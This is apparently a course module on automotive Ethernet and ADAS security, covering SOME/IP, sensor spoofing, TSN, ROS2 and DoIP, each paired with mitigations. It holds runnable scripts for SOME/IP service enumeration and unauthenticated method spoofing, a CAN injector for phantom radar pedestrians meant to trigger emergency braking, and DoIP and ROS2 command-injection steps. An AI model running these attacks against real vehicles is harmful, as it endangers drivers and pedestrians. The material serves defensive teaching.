# Module 07 — Automotive Ethernet & ADAS Security

> Level: Advanced | Est. study time: 10 hours

---

## 7.1 Automotive Ethernet Security Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                   AUTOMOTIVE ETHERNET TOPOLOGY                       │
│                                                                      │
│  ┌──────────┐  100BASE-T1   ┌──────────────────┐                   │
│  │ Front    ├───────────────► Central Switch    │                   │
│  │ Camera   │               │ (802.1Q VLANs)   │                   │
│  └──────────┘               │ (802.1AS-rev TSN)│                   │
│                             │                  │                   │
│  ┌──────────┐  100BASE-T1   │                  │  1000BASE-T1      │
│  │ Radar    ├───────────────►                  ├─────────────────► │
│  │ (77GHz)  │               │                  │   ADAS ECU/HPC    │
│  └──────────┘               │                  │                   │
│                             │                  │  1000BASE-T1      │
│  ┌──────────┐  100BASE-T1   │                  ├─────────────────► │
│  │ LiDAR    ├───────────────►                  │   Telematics TCU  │
│  └──────────┘               └──────────────────┘                   │
│                                                                      │
│  Security Boundaries:                                                │
│    VLAN 10: Sensor data (unencrypted, TSN-scheduled)                 │
│    VLAN 20: ADAS control (SecOC or TLS DTLS)                         │
│    VLAN 30: Telematics/OTA (TLS 1.3 mandatory)                       │
│    VLAN 40: Diagnostics/DoIP (TLS optional, Auth mandatory)          │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 7.2 SOME/IP Security Attacks

### Service Enumeration via SOME/IP-SD

```python
"""
SOME/IP Service Discovery (SD) listens on UDP 30490.
Attacker on same VLAN can enumerate all available services.
"""
import socket
import struct

SOMEIP_SD_PORT = 30490
SOMEIP_SD_MULTICAST = "239.192.255.251"

def parse_someip_header(data: bytes) -> dict:
    """Parse SOME/IP message header"""
    if len(data) < 16:
        return {}
    
    service_id  = struct.unpack_from(">H", data, 0)[0]
    method_id   = struct.unpack_from(">H", data, 2)[0]
    length      = struct.unpack_from(">I", data, 4)[0]
    client_id   = struct.unpack_from(">H", data, 8)[0]
    session_id  = struct.unpack_from(">H", data, 10)[0]
    proto_ver   = data[12]
    iface_ver   = data[13]
    msg_type    = data[14]
    return_code = data[15]
    
    return {
        "service_id": f"0x{service_id:04X}",
        "method_id":  f"0x{method_id:04X}",
        "msg_type":   {0x00:"REQUEST", 0x01:"REQ_NO_RETURN",
                       0x02:"NOTIFICATION", 0x80:"RESPONSE"}.get(msg_type, hex(msg_type)),
        "client_id":  f"0x{client_id:04X}",
    }

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
               socket.inet_aton(SOMEIP_SD_MULTICAST) + socket.inet_aton("0.0.0.0"))
sock.bind(("", SOMEIP_SD_PORT))

print("Enumerating SOME/IP services (listening for OfferService)...")
discovered_services = set()

while True:
    data, addr = sock.recvfrom(4096)
    parsed = parse_someip_header(data)
    if parsed.get("service_id") == "0xFFFF":  # SD service ID
        # Parse SD entries to extract offered service IDs
        if len(data) >= 28:
            entry_type = data[24]
            if entry_type == 0x01:  # OfferService
                svc_id = struct.unpack_from(">H", data, 28)[0]
                inst_id = struct.unpack_from(">H", data, 30)[0]
                if svc_id not in discovered_services:
                    discovered_services.add(svc_id)
                    print(f"[+] Service found: 0x{svc_id:04X} "
                          f"Instance: 0x{inst_id:04X} from {addr[0]}")
```

### SOME/IP Method Spoofing

```python
"""
Attack: Call ADAS service method without authentication
(SOME/IP pre-R22 has no built-in authentication)
"""
import socket
import struct

def craft_someip_request(service_id: int, method_id: int, payload: bytes) -> bytes:
    """Craft a SOME/IP REQUEST message"""
    client_id  = 0x0001   # attacker's client ID (can be arbitrary)
    session_id = 0x0001
    proto_ver  = 0x01
    iface_ver  = 0x01
    msg_type   = 0x00     # REQUEST
    return_code= 0x00
    
    length = 8 + len(payload)  # header after length field + payload
    
    header = struct.pack(">HHIHHBBBB",
        service_id, method_id, length,
        client_id, session_id,
        proto_ver, iface_ver, msg_type, return_code)
    
    return header + payload

# Example: Call ADAS Calibration Reset service (no auth required pre-R22)
target_ip   = "192.168.10.50"  # ADAS ECU IP
target_port = 30501             # ADAS service port

payload = struct.pack(">I", 0x00000001)  # Reset parameter
msg = craft_someip_request(
    service_id = 0x1234,  # ADAS calibration service (reverse-engineered)
    method_id  = 0x0001,  # Reset method
    payload    = payload
)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(msg, (target_ip, target_port))
print(f"Sent SOME/IP request to {target_ip}:{target_port}")
response = sock.recv(4096)
print(f"Response: {response.hex()}")
```

---

## 7.3 ADAS Sensor Attack Vectors

### Camera Feed Manipulation

```
ATTACK SCENARIOS:

1. Optical Attack (Hardware):
   - Bright flashlight / laser directly at camera lens
   - Causes sensor saturation → lane markings invisible → LKA disabled
   - Infrared LED (invisible to human) → blinds IR-based DMS camera

2. Video Feed Injection (Software — if camera over IP):
   - Attacker on same VLAN intercepts RTSP/RTP stream
   - Replays pre-recorded clean video → masks real obstacles
   - ADAS ECU processes injected frames → does not detect pedestrian
   
3. Adversarial Patches (Physical):
   - Printed pattern on stop sign → misclassified as speed limit sign
   - Sticker on road → TSR reads wrong speed limit
   - Physical attack on TSR perception

DETECTION:
   - Multiple overlapping cameras (redundancy) — compare outputs
   - Camera health monitoring: brightness histogram, blur score
   - Inertial plausibility: if car is turning, camera should see curved road
   - Cross-sensor validation: camera + radar must agree on object presence
```

### Radar Spoofing

```
Attack: Transmit falsified radar reflections to ADAS ECU

Physical Radar Jammer:
  - Receive 77 GHz radar signal
  - Retransmit delayed (simulates further object)
  - Or retransmit earlier (simulates phantom approaching object)
  - AEB triggers for non-existent obstacle

Digital Radar Spoofing (FMCW):
  Target radar freq: 77 GHz (FMCW modulation)
  - Record radar chirp parameters from vehicle
  - Generate counter-chirp at shifted frequency
  - ADAS ECU processes phantom targets

Detection:
  - Multi-sensor fusion (radar + camera + lidar must agree)
  - Doppler consistency check
  - Object tracking: phantom objects appear/disappear unrealistically
  - Plausibility filter: object velocity must match physical laws
```

### GPS Spoofing

```
Attack: Transmit fake GPS signals stronger than satellite signals
  - Civilian GPS (unencrypted) → spoofable with ~$300 SDR (Software Defined Radio)
  - Military GPS (M-code) → resistant to spoofing

Impact in vehicles:
  - Navigation routes to wrong destination
  - Geofencing bypass (EV off-limits zones, speed restrictions)
  - V2X position spoofing (vehicle announces wrong position)
  - Fleet management: vehicle reports false location

Countermeasures:
  - Multi-constellation GNSS (GPS + GLONASS + Galileo + BeiDou)
  - GNSS + Dead Reckoning fusion (wheel speed + IMU)
  - Signal strength anomaly detection (spoofed signals often too strong)
  - Temporal consistency: position jumps are physically impossible
  - V2X: position signed by PKI (V2X Certificate Authority)
```

---

## 7.4 ADAS Perception Attack — False Object Injection

```python
"""
Simulation: Inject fake radar objects into ADAS CAN bus
(Educational — demonstrates why SecOC is needed on ADAS bus)
"""
import can
import struct

bus = can.Bus(channel='vcan0', bustype='socketcan')

def craft_radar_object(obj_id: int, distance_m: float, 
                       velocity_mps: float, angle_deg: float) -> bytes:
    """
    Craft a fake radar object CAN frame.
    Format based on common Bosch LRR3/LRR4 CAN signal map.
    """
    # Pack into CAN frame (simplified format)
    raw_dist  = int(distance_m / 0.1)   # 0.1m per bit
    raw_vel   = int((velocity_mps + 128) / 0.25)  # offset binary
    raw_angle = int((angle_deg + 75) / 0.5)       # -75 to +75 degrees
    
    data = struct.pack(">HHHH",
        (obj_id & 0x3F) | ((raw_dist & 0x3FF) << 6),
        raw_vel & 0x1FF,
        raw_angle & 0xFF,
        0x0000  # status/quality bytes
    )
    return data[:8]

def inject_phantom_pedestrian(distance_m: float = 3.0):
    """
    Inject a fake stationary pedestrian at 3m ahead.
    With no SecOC → ADAS ECU accepts this as genuine radar data.
    Result: AEB triggers at highway speed (safety-critical!)
    """
    print(f"Injecting phantom pedestrian at {distance_m}m ahead...")
    
    # Radar object message ID (hypothetical, reverse-engineered)
    RADAR_OBJ_ID = 0x440
    
    for _ in range(100):  # Inject for ~1 second at 100Hz
        data = craft_radar_object(
            obj_id=1,
            distance_m=distance_m,
            velocity_mps=0.0,    # stationary
            angle_deg=0.0         # directly ahead
        )
        
        msg = can.Message(
            arbitration_id=RADAR_OBJ_ID,
            data=list(data),
            is_extended_id=False
        )
        bus.send(msg)
    
    print("Injection complete. AEB should have triggered.")

# MITIGATION: SecOC on RADAR_OBJ_ID
# Each radar object message includes:
# - CMAC-AES-128 over (obj_data + freshness_counter)
# - Freshness counter from HSM monotonic counter
# - Only genuine radar ECU with correct SecOC key can produce valid MAC
# → Injected frames fail MAC verification → ADAS ECU discards them
```

---

## 7.5 TSN (Time-Sensitive Networking) Security

TSN provides deterministic Ethernet for safety-critical functions:

```
IEEE 802.1AS:  Generalized PTP (gPTP) — time synchronization
IEEE 802.1Qbv: Time-Aware Shaper — scheduled traffic windows
IEEE 802.1Qci: Per-Stream Filtering and Policing
IEEE 802.1Qbu: Frame Preemption
IEEE 802.1CB:  Frame Replication and Elimination

TSN Security Risks:
┌─────────────────────────────────────────────────────────────────┐
│ 1. Time sync attack (802.1AS spoofing)                          │
│    → Attacker sends fake gPTP Announce messages                 │
│    → Corrupts vehicle-wide time reference                       │
│    → Sensor fusion timestamps desynchronized                    │
│    → Impact: ADAS processes stale/misaligned data               │
│                                                                 │
│ 2. Stream reservation abuse (802.1Qav)                          │
│    → Attacker reserves excessive bandwidth                      │
│    → Legitimate safety streams starved                          │
│                                                                 │
│ 3. VLAN hopping                                                 │
│    → Double-tagging attack on unprotected trunk ports           │
│    → Cross VLAN boundary (sensor VLAN → control VLAN)          │
│                                                                 │
│ Mitigations:                                                    │
│    - 802.1AS with MACSEC authentication on gPTP messages        │
│    - 802.1Qci stream filtering (drop unauthorized streams)      │
│    - Strict VLAN pruning on switch ports                        │
│    - Rate limiting per stream at ingress                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## 7.6 ROS2 Security (for Autonomous Vehicles)

Autonomous driving stacks (Autoware, Apollo) use ROS2:

```
ROS2 Communication Model:
  Publisher ──(DDS/RTPS)──► Subscriber
  
Security (SROS2):
  - DDS-Security standard (OMG DDS Security 1.1)
  - Each node has X.509 certificate
  - Access control policy (XML): specifies which topics node can publish/subscribe
  - Payload encryption: AES-256-GCM per topic
  - Authentication: PKI-based node identity

ROS2 Attack Vectors:
┌──────────────────────────────────────────────────────────────┐
│ Without SROS2:                                               │
│   ros2 topic list           → enumerate all topics          │
│   ros2 topic echo /cmd_vel  → spy on velocity commands      │
│   ros2 topic pub /cmd_vel   → inject velocity commands!     │
│   (Full vehicle control takeover possible)                   │
│                                                              │
│ With SROS2 + DDS-Security:                                   │
│   - Node must have valid cert to participate                 │
│   - Access control prevents unauthorized pub/sub            │
│   - Payload encrypted → eavesdropping blocked               │
│   - Message authentication → injection blocked              │
└──────────────────────────────────────────────────────────────┘

Critical ROS2 Topics to Protect (AV):
  /perception/detected_objects   → Input to planning
  /planning/trajectory           → Input to control
  /control/cmd_vel               → Actual vehicle control
  /localization/pose             → Vehicle position
  /diagnostics                   → System health
```

---

## 7.7 DoIP Security

```
DoIP (ISO 13400) over UDP/TCP Ethernet:

Attack: Unauthorized ECU access via DoIP routing

Step 1: Vehicle Announcement (UDP broadcast, port 13400)
  Vehicle broadcasts: VIN + EID (entity ID) + GID (group ID)
  Attacker receives: vehicle discovery info

Step 2: Routing Activation Request (TCP)
  >> Routing Activation Request (type 0x0005)
     Source Address: 0x0E00 (tester)
     Activation Type: 0x00 (default — no auth on many implementations)
  << Routing Activation Response: 0x0006
     Response code: 0x10 (Routing successfully activated)
     
  Attacker now has full UDS access to all ECUs via DoIP routing!

Step 3: UDS diagnostics over DoIP
  >> DoIP header + UDS request (0x22 0xF1 0x90)  ← Read VIN
  << DoIP header + UDS response
  
  Attacker reads any DID, clears DTCs, triggers IO control...

Mitigation:
  1. Routing activation requires authentication (activation type 0xE0)
  2. TLS 1.3 mutual authentication (OEM CA cert + tester cert)
  3. IP allowlist: only trusted diagnostic tools can connect
  4. Rate limiting on DoIP routing activation attempts
  5. MAC-level filtering on diagnostic Ethernet port
```

---

## 7.8 Summary — Module 07

```
KEY TAKEAWAYS:

✓ SOME/IP has no built-in security pre-R22 — any node can call any service
✓ SOME/IP-SD broadcasts expose full service catalog to any listener on VLAN
✓ Camera/radar/LiDAR can all be attacked: physical, signal, software injection
✓ Multi-sensor fusion is the primary defense against single-sensor spoofing
✓ TSN time sync (gPTP) can be attacked — MACSEC authentication recommended
✓ ROS2 must use SROS2/DDS-Security or entire AV can be commanded by attacker
✓ DoIP routing activation must require TLS mutual auth — default auth is trivial
✓ GPS spoofing countermeasure: multi-constellation + inertial dead reckoning
✓ VLAN segmentation: sensor data, ADAS control, telematics must be isolated
```

**Next Module**: [08 — OTA & Connected Vehicle Security](08_ota_connected_security.md)
